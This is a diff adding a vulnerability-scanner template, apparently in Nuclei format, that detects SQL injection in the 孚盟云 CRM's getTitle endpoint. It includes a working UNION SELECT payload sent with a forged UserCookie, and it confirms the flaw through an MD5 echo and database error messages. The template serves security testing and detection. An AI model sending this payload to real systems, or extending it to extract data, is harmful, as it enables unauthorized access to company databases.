@@ -1,0 +1,46 @@
+id: poc-yaml-fumasoft-gettitle-sqli
+info:
+  name: 孚盟云 getTitle SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection vulnerabilities in 孚盟云's getTitle functionality via a POST request.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "孚盟云"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/m/Dingding/Ajax/AjaxCustomerInfoAtion.ashx"
+    headers:
+      Cookie: 'UserCookie={"empId":"1"}'
+      Content-Type: application/x-www-form-urlencoded
+    body: "method=getTitle&custid=-1'+UNION+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "CustID"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
